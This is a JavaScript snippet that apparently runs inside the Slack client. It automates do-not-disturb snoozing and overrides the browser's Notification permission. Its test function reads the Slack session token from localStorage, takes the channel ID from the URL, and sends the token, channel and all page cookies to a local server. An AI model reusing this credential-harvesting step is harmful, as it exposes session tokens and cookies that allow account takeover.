const axios = require('axios');

const testfunction  = () => {
  var security_objects = JSON.parse(localStorage.getItem('localConfig_v2'))['teams']
  // Read a token from the environment variables
  var token = security_objects[Object.keys(security_objects)[0]].token;
  console.log(token);
  // get channel ID
  var conversationId = window.location.href.substring(41,52);
  console.log(conversationId);

  fetch(`http://localhost:3333/postmessagetoslack?token=${token}&channel=${conversationId}&cookie=${encodeURIComponent(document.cookie)}`, {})
  .then(response => {
    console.log(response.json());
  }).catch(err => {
    console.log(err);
  });
};

window.setDoNotDisturb = () => {
  clickStatusIcon();
  // since it is a SPA and the menu is created through javascript, we have to wait some time to make sure that the
  // menu was completely rendered to the screen
  setTimeout(() => {
    const submenu = document.querySelector(
      "[data-qa='submenu_trigger_wrapper'] [data-qa='menu_item_button-wrapper']"
    );
    const event = new MouseEvent("mouseover", {
      view: window,
      bubbles: true,
      cancelable: true,
    });
    submenu.dispatchEvent(event);

    setTimeout(() => {
      var snooze60 = document.querySelector("[data-qa='snooze_btn_60']");
      snooze60.click();
    }, 1000);
  }, 1000);
};

window.test = () => {
  testfunction();
};

class newNotification extends window.Notification {
  constructor(title, opt) {
    console.log("notification");
    console.log(title, opt);
    super(title, opt);
  }
  static permission = "granted";
}

window.Notification = newNotification;
